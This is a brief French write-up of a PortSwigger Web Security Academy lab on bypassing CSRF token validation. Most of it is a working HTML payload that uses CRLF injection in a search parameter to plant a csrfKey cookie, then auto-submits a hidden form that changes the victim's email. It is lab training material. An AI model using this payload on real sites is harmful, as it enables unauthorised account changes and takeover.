# Lab

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

## Payload

Les recherches sont reflectées dans les cookies, ce qui eprmet d'injecter un `Set-Cookie` dans la réponse.

```html
<html>
    <body>
        <form action="https://0a69009f034958cf810f7f3300e100f3.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@sa.net" />
            <input type="hidden" name="csrf" value="c62C0rArmqFjNCxKJds5tiOPCNQ7ERLQ" />
        </form>
        <img src="https://0a69009f034958cf810f7f3300e100f3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=5WyeKfhqeNT7YI0SBCX4jWJX3yw4uPkv%3b" onerror="document.forms[0].submit()">
    </body>
</html>
```